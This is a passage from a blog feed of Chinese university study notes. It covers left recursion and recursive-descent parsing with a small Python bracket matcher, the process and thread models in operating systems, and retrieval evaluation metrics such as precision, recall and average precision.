src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211209148291_380_20221008190813022183_796_image-20221004152827769.png" alt="image-20221004152827769"><figcaption aria-hidden="true">image-20221004152827769</figcaption></figure><p>对于<span class="math inline">\(simple\)</span>类似构造方法。</p><p><span class="math inline">\(lookahead\)</span>怎么构造？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211210810779_780_20221008190816136501_201_image-20221004153753520.png" alt="image-20221004153753520"><figcaption aria-hidden="true">image-20221004153753520</figcaption></figure><p>总体思路是什么，还有什么问题？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211212658010_201_20221008190818280251_227_image-20221004154007046.png" alt="image-20221004154007046"><figcaption aria-hidden="true">image-20221004154007046</figcaption></figure><h5 id="左递归问题">左递归问题</h5><p>针对上面的预测分析法，我们发现：左递归会导致递归下降程序无限循环以及预测分析法的失效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r0l429lluwpkzu"></i><span>c</span><div class="collapse show" id="collapse-r0l429lluwpkzu"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">A</span><span class="hljs-params">()</span>{    <span class="hljs-keyword">switch</span>(lookahead){        <span class="hljs-keyword">case</span> a:            A();match(a);<span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> b:            match(b):<span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            report(<span class="hljs-string">"syntax error"</span>)    }}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211214168581_153_20221008190819993463_865_image-20221004160548627.png" alt="image-20221004160548627"><figcaption aria-hidden="true">image-20221004160548627</figcaption></figure><p>怎么消除？</p><p>固定的算法：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211215878429_716_20221008190821656013_971_image-20221004160612826.png" alt="image-20221004160612826"><figcaption aria-hidden="true">image-20221004160612826</figcaption></figure><p>理解：<span class="math inline">\(A=\beta \alpha \alpha...\)</span></p><p>采用右递归进行翻译</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211217282590_960_20221008190823148967_751_image-20221004161628877.png" alt="image-20221004161628877"><figcaption aria-hidden="true">image-20221004161628877</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211218858247_264_20221008190827034211_692_image-20221004161643180.png" alt="image-20221004161643180"><figcaption aria-hidden="true">image-20221004161643180</figcaption></figure><h5 id="练习-1">练习</h5><p>构造 S -&gt; S ( S ) S | ε 的语法分析器</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-75znn4lluwpkzu"></i><span>python</span><div class="collapse show" id="collapse-75znn4lluwpkzu"><pre><code class="hljs python"><span class="hljs-comment"># a program to test lookahead grammar analysis</span><span class="hljs-comment"># S -&gt; S ( S ) S | ε to match brackets</span><span class="hljs-comment"># it can be simplified to S -&gt; ( S ) S | ε</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Matcher</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, string</span>):        self.string = string        self.index = <span class="hljs-number">0</span>        self.lookahead = self.string[self.index] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.string) &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">""</span>        self.process = <span class="hljs-string">"S"</span>        self.lookaheads = []    <span class="hljs-keyword">def</span> <span class="hljs-title function_">match</span>(<span class="hljs-params">self, char</span>):        <span class="hljs-keyword">if</span> char == <span class="hljs-string">''</span>:            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> char == self.lookahead:            self.index += <span class="hljs-number">1</span>            <span class="hljs-keyword">if</span> self.index &lt; <span class="hljs-built_in">len</span>(self.string):                self.lookahead = self.string[self.index]            <span class="hljs-keyword">else</span>:                self.lookahead = <span class="hljs-string">""</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Not matched"</span>)            exit(<span class="hljs-number">1</span>)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">S</span>(<span class="hljs-params">self</span>):        self.lookaheads.append(self.lookahead)        <span class="hljs-keyword">if</span> self.lookahead == <span class="hljs-string">'('</span>:            self.process = self.process.replace(<span class="hljs-string">"S"</span>, <span class="hljs-string">"( S ) S"</span>, <span class="hljs-number">1</span>)            <span class="hljs-built_in">print</span>(self.process)            self.<span class="hljs-keyword">match</span>(<span class="hljs-string">'('</span>)            self.S()            self.<span class="hljs-keyword">match</span>(<span class="hljs-string">')'</span>)            self.S()        <span class="hljs-keyword">else</span>:            self.process = self.process.replace(<span class="hljs-string">"S"</span>, <span class="hljs-string">"ε"</span>, <span class="hljs-number">1</span>)            <span class="hljs-built_in">print</span>(self.process)            self.<span class="hljs-keyword">match</span>(<span class="hljs-string">''</span>)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">self</span>):        self.S()        <span class="hljs-keyword">if</span> self.lookahead == <span class="hljs-string">''</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Matched"</span>)            <span class="hljs-built_in">print</span>(self.process)            <span class="hljs-built_in">print</span>(self.lookaheads)        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"Not matched,the lookahead now is"</span>, self.lookahead)            <span class="hljs-built_in">print</span>(self.process)            <span class="hljs-built_in">print</span>(self.lookaheads)            exit(<span class="hljs-number">1</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Enter a string to match: "</span>)    target = <span class="hljs-built_in">input</span>()    matcher = Matcher(target)    matcher.main()</code></pre></div></div><p>运行结果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80%E4%BA%8C%E7%AB%A0/20230828211220172106_444_20221025232547008661_894_image-20221009204230516.png" alt="image-20221009204230516"><figcaption aria-hidden="true">image-20221009204230516</figcaption></figure><h4 id="词法分析">词法分析</h4>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统_进程与线程模型</title>
    <link href="/posts/30463/"/>
    <url>/posts/30463/</url>
    
    <content type="html"><![CDATA[<h2 id="操作系统--进程与线程">操作系统--进程与线程</h2><h3 id="进程概念">进程概念</h3><h4 id="从并发开始">从并发开始</h4><p>串行排队</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210733845566_917_20221019110755222583_746_image-20220926142304076.png" alt="image-20220926142304076"><figcaption aria-hidden="true">image-20220926142304076</figcaption></figure><p>分时调用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210734963850_163_20221019110756926120_483_image-20220926142216136.png" alt="image-20220926142216136"><figcaption aria-hidden="true">image-20220926142216136</figcaption></figure><p>“但是并发除了会让脑子更乱以外并不会让事情变得更好”</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210736115343_796_20221019110758632298_262_image-20220926151301063.png" alt="image-20220926151301063"><figcaption aria-hidden="true">image-20220926151301063</figcaption></figure><p>尽管如此，并发确实可以提高CPU的利用率。当然可能会带来设备（慢操作）延迟。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210737627177_866_20221019110801392732_151_image-20221018192004694.png" alt="image-20221018192004694"><figcaption aria-hidden="true">image-20221018192004694</figcaption></figure><p>C</p><p><strong>进程就是为了“保存”和“恢复”一个程序的执行过程，以实现并发的目标</strong></p><h4 id="进程和程序的区别">进程和程序的区别</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210739060065_253_20221019110803473763_292_image-20221016200649356.png" alt="image-20221016200649356"><figcaption aria-hidden="true">image-20221016200649356</figcaption></figure><h3 id="进程和线程的区别">进程和线程的区别</h3><ul><li><p>进程作为分配资源的基本单位，线程作为独立运行和独立调度的基本单位(注意：在多线程OS 中，进程不是一个可执行的实体)</p></li><li><p>进程拥有一个完整的虚拟地址空间，不依赖于线程而独立存在；反之，线程是进程的一部分，没有自己的地址空间，与进程内的其他线程一起共享分配给该进程的所有资源。</p></li></ul><h3 id="进程的数据结构--pcb">进程的数据结构--PCB</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210740834601_450_20221019110805822552_826_image-20220926152249647.png" alt="image-20220926152249647"><figcaption aria-hidden="true">image-20220926152249647</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210741862299_153_20221019110807671323_383_image-20221018191442452.png" alt="image-20221018191442452"><figcaption aria-hidden="true">image-20221018191442452</figcaption></figure><h3 id="进程的组织">进程的组织</h3><h4 id="进程状态和切换">进程状态和切换</h4><p class="note note-primary">对于某一个进程： 为什么被暂停了？ 为什么选它来运行？为什么选择这个时机进行切换？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210744007444_666_20221019110809885582_767_image-20221018191551669.png" alt="image-20221018191551669"><figcaption aria-hidden="true">image-20221018191551669</figcaption></figure><p>操作系统可以将会触发慢操作的状态记录下来。</p><p class="note note-primary">“把printf的汇编代码放到自己的程序中，并且把控制休眠的指令注释掉，会不会能正常运行？”</p><p>不能。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210745247267_536_20221019110811863911_528_image-20220926161106287.png" alt="image-20220926161106287" width="50%" height="50%"></p><h5 id="五状态进程模型">五状态进程模型</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210746398255_505_20221019110813764309_930_image-20221014152546893.png" alt="image-20221014152546893"><figcaption aria-hidden="true">image-20221014152546893</figcaption></figure><p>关于进程的创建：</p><p>在一个进程被新建时它并非绝对会被调入内存，通常是分两步，首先创建该进程的PCB，并与之关联，但是此时可能面临内存不足或者操作系统限制了最大进程数导致这个进程还无法被调入进程，因此该进程被暂时留在新建态，在这个状态的进程PCB已经创建并且加载进内存，但是进程的代码和数据往往还留在外存中等待加载。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210748249617_239_20221019110816170775_715_image-20221018205252597.png" alt="image-20221018205252597"><figcaption aria-hidden="true">image-20221018205252597</figcaption></figure><p>关于进程的撤销(结束)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210749945224_194_20221019110817967015_206_image-20221016192515282.png" alt="image-20221016192515282"><figcaption aria-hidden="true">image-20221016192515282</figcaption></figure><blockquote><p>B。进程有它的生命周期，不会一直存在于系统中，也不一定需要用户显式地撒销。进程在时间片结束时只是就绪，而不是撤销。阻塞和唤醒是进程生存期的中间状态。进程可在完成时撤销，或在出现内存错误等时撤销。</p></blockquote><p>关于进程的阻塞</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210750935983_266_20221019110819440912_574_image-20221018192631681.png" alt="image-20221018192631681"><figcaption aria-hidden="true">image-20221018192631681</figcaption></figure><p>阻塞态完了会进就绪队列</p><p><a target="_blank" href="https://houbb.github.io/2020/10/04/os-04-sync" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">关于临界资源及其同步和互斥</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://houbb.github.io/2020/10/04/os-04-sync</span></span></span></a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210751921582_106_20221019110821096921_713_image-20221018214846546.png" alt="image-20221018214846546"><figcaption aria-hidden="true">image-20221018214846546</figcaption></figure><blockquote><p>B 可以共享一部分资源，但不共享虚拟地址空间</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210753335528_479_20221019110822817914_214_image-20221018214339806.png" alt="image-20221018214339806"><figcaption aria-hidden="true">image-20221018214339806</figcaption></figure><blockquote><p>C</p></blockquote><h5 id="添加了挂起状态的进程模型">添加了挂起状态的进程模型</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210754362386_519_20221019110824611329_729_image-20220926162706586.png" alt="image-20220926162706586"><figcaption aria-hidden="true">image-20220926162706586</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210755618064_936_20221019110826436181_342_image-20221014151453508.png" alt="image-20221014151453508"><figcaption aria-hidden="true">image-20221014151453508</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210757396249_122_20221019110828695748_821_image-20221018192900616.png" alt="image-20221018192900616"><figcaption aria-hidden="true">image-20221018192900616</figcaption></figure><p>A</p><p class="note note-info">不同操作系统中进程状态设置区别很大。</p><h5 id="进程调度方式">进程调度方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210758402892_633_20221019110830191623_314_image-20220926162928685.png" alt="image-20220926162928685"><figcaption aria-hidden="true">image-20220926162928685</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210759559721_216_20221019110832168851_702_image-20220926163633315.png" alt="image-20220926163633315"><figcaption aria-hidden="true">image-20220926163633315</figcaption></figure><p>现在的操作系统都是可抢占系统。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210800855757_695_20221019110834324423_859_image-20221018205406513.png" alt="image-20221018205406513"><figcaption aria-hidden="true">image-20221018205406513</figcaption></figure><blockquote><p>A。BC应该将优先级，D时机不合适。</p><p>此部分将在进程调度中详细介绍。</p></blockquote><h4 id="进程通信">进程通信</h4><p>共享存储，消息传递，管道通信</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210802133591_581_20221019110836886804_366_image-20221018211857840.png" alt="image-20221018211857840"><figcaption aria-hidden="true">image-20221018211857840</figcaption></figure><p><a href="https://zhuanlan.zhihu.com/p/58489873">linux中的管道通信</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210803836196_270_20221019110839761934_452_image-20221018211911941.png" alt="image-20221018211911941"><figcaption aria-hidden="true">image-20221018211911941</figcaption></figure><blockquote><p>A得俩。B容量是一个页的大小(4KB)。管道是一个文件，任何两个不相关的进程当然都可以通过这个管道文件进行通信</p></blockquote><h4 id="进程和线程的设计模型">进程和线程的设计模型</h4><h5 id="线程实现方式">线程实现方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210805032394_967_20221019110841591537_254_image-20221018194121923.png" alt="image-20221018194121923"><figcaption aria-hidden="true">image-20221018194121923</figcaption></figure><h6 id="ultuser-level-thread">ULT(User Level Thread)</h6><p>需要注意的是在这种模式下调度仍是以进程为单位进行的</p><p>优势:</p><p>1.线程切换不需要内核模式特权.</p><p>2.线程调用可以是应用程序级的,根据需要可改变调度算法,但不会影响底层的操作系统调度程序.</p><p>3.ULT管理模式可以在任何操作系统中运行,不需要修改系统内核,线程库是提供应用的实用程序。</p><p>劣势:</p><p>1.系统调用(慢操作，如输入输出)会引起进程阻塞，而且进程内的所有线程都被阻塞。(内核每次分配给一个进程的仅有一个CPU，因此进程中仅有一个线程能执行)</p><p>2.不利于使用多处理器并行</p><h6 id="klt">KLT</h6><p>优势：灵活，线程切换快</p><p>劣势：需要用户态到内核态的切换，代价高</p><p>线程库：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210806392125_868_20221019110843340452_876_image-20221018193551401.png" alt="image-20221018193551401"><figcaption aria-hidden="true">image-20221018193551401</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210807734009_103_20221019110847145883_201_image-20221018205754448.png" alt="image-20221018205754448"><figcaption aria-hidden="true">image-20221018205754448</figcaption></figure><blockquote><p>D.其他线程对此不可见</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210808930696_547_20221019110848853722_394_image-20221018214600427.png" alt="image-20221018214600427"><figcaption aria-hidden="true">image-20221018214600427</figcaption></figure><blockquote><p>B只有在KLT中才会这么做</p></blockquote><h5 id="轻权进程"><a href="https://en.wikipedia.org/wiki/Light-weight_process#cite_note-Vah96-1">轻权进程</a></h5><p>类似于一种折衷的方案。但是问题是太复杂</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F_%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B/20230828210810073059_437_20221019110850808418_676_image-20221018234308117.png" alt="image-20221018234308117"><figcaption aria-hidden="true">image-20221018234308117</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息检索_系统评价</title>
    <link href="/posts/23422/"/>
    <url>/posts/23422/</url>
    
    <content type="html"><![CDATA[<h1 id="信息检索_系统评价">信息检索_系统评价</h1><h2 id="总思路">总思路</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210413749537_765_20221102181425241957_651_image-20221102140305383.png" alt="image-20221102140305383"><figcaption aria-hidden="true">image-20221102140305383</figcaption></figure><h2 id="单查询">单查询</h2><h3 id="无序检索结果集合的评价">无序检索结果集合的评价</h3><details><summary>回顾</summary><p>查准率 (Precision) : <span class="math inline">\(P=\frac{T P}{T P+FP}\)</span> 。预测正确的正例数据占预测为正例数据的比例。</p><p>召回率 (Recall) : <span class="math inline">\(R=\frac{TP}{TP+FN}\)</span> 。预测为正例的数据占实际为正例数据的比例。</p>F1值 (F1 score) : <span class="math display">\[F1=\frac{2}{\frac{1}{P}+\frac{1}{R}}=\frac{2 * P * R}{P+R}\nonumber\]</span></details><h3 id="有序检索结果集合的评价">有序检索结果集合的评价</h3><h4 id="p-r曲线的例子">P-R曲线的例子</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210415422791_840_20221102181427482098_652_image-20221102141151261.png" alt="image-20221102141151261"><figcaption aria-hidden="true">image-20221102141151261</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210416775229_758_20221102181431710114_302_image-20221102141322869.png" alt="image-20221102141322869" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210417972832_913_20221102181432975281_362_image-20221102142019252.png" alt="image-20221102142019252"><figcaption aria-hidden="true">image-20221102142019252</figcaption></figure><h4 id="平均正确率ap">平均正确率AP</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210419282313_192_20221102181435795246_414_image-20221102142247895.png" alt="image-20221102142247895"><figcaption aria-hidden="true">image-20221102142247895</figcaption></figure><h4 id="precisionn">Precision@N</h4><p>Precision@N：在第N个位置上的正确率，对于搜索引擎，大量统计数据表明，大部分搜索引擎用户只关注前一、两页的结果，因此，P@10，P@20对大规模搜索引擎来说是很好的评价指标</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B3%BB%E7%BB%9F%E8%AF%84%E4%BB%B7/20230828210420576008_695_20221102181437971719_189_image-20221102142715051.png" alt="image-20221102142715051"><figcaption aria-hidden="true">image-20221102142715051</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息检索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息检索_索引构建、压缩及查询支持</title>
    <link href="/posts/16720/"/>
    <url>/posts/16720/</url>
    
